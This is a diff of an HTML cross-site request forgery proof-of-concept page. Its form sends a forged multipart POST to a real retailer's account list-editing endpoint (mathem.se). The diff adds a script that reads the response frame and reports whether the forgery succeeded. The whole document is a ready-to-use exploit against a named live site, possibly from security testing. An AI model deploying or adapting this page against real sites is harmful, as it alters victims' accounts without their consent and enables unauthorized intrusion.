@@ -1,26 +1,57 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>CSRF PoC Manual Submit</title>
+  <meta charset="UTF-8">
+  <title>CSRF PoC with Feedback</title>
+  <script>
+    function submitCSRF() {
+      const status = document.getElementById('status');
+      status.textContent = "Submitting...";
+
+      // Track iframe load to infer response
+      const iframe = document.getElementById('responseFrame');
+      iframe.onload = function () {
+        try {
+          const doc = iframe.contentDocument || iframe.contentWindow.document;
+          const bodyText = doc.body.textContent || doc.body.innerText;
+
+          if (bodyText.includes("403") || bodyText.includes("unauthorized") || bodyText.includes("logga in")) {
+            status.textContent = "❌ CSRF Failed: Likely rejected due to missing token or authentication.";
+          } else {
+            status.textContent = "✅ CSRF Request Sent. Check if changes took effect.";
+          }
+        } catch (e) {
+          status.textContent = "⚠️ Unable to access response (likely due to cross-origin restrictions), but request was sent.";
+        }
+      };
+    }
+  </script>
 </head>
 <body>
 
-  <h1>CSRF PoC — Manual Submit with Feedback</h1>
+  <h2>CSRF PoC with Feedback</h2>
 
-  <form id="csrfForm" action="https://www.mathem.se/se/account/lists/edit/" method="POST" enctype="multipart/form-data" target="hiddenFrame">
+  <form 
+    id="csrfForm" 
+    action="https://www.mathem.se/se/account/lists/edit/" 
+    method="POST" 
+    enctype="multipart/form-data" 
+    target="responseFrame"
+    onsubmit="submitCSRF()">
+
     <label>Title:</label><br>
     <input type="text" name="title" value="CSRF Attack"><br><br>
 
     <label>Description:</label><br>
     <textarea name="description">CSRF via multipart/form-data</textarea><br><br>
 
-    <input type="submit" value="Submit CSRF Request">
+    <input type="submit" value="Submit CSRF">
   </form>
 
-  <p id="status">Waiting for submission...</p>
+  <p id="status">Waiting to submit...</p>
 
-  <!-- Hidden iframe for silent form submission -->
-  <iframe name="hiddenFrame" style="display:none;" onload="document.getElementById('status').textContent = 'Request submitted. Check target server response.';"></iframe>
+  <!-- Hidden response frame -->
+  <iframe name="responseFrame" id="responseFrame" style="width:100%; height:150px; border:1px solid #ccc;"></iframe>
 
 </body>
 </html>
